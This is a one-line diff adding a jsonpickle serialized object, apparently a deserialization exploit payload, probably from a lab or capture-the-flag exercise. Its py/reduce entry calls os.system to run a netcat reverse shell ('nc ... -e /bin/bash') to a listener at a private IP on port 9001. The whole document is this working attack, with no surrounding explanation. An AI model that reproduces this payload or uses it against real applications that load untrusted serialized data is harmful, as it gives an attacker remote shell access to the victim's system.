@@ -1,0 +1,1 @@
+{"py/object":"__main__.Shell","py/reduce":[{"py/function":"os.system"},["nc 192.168.122.1 9001 -e /bin/bash"], 0, 0, 0]}
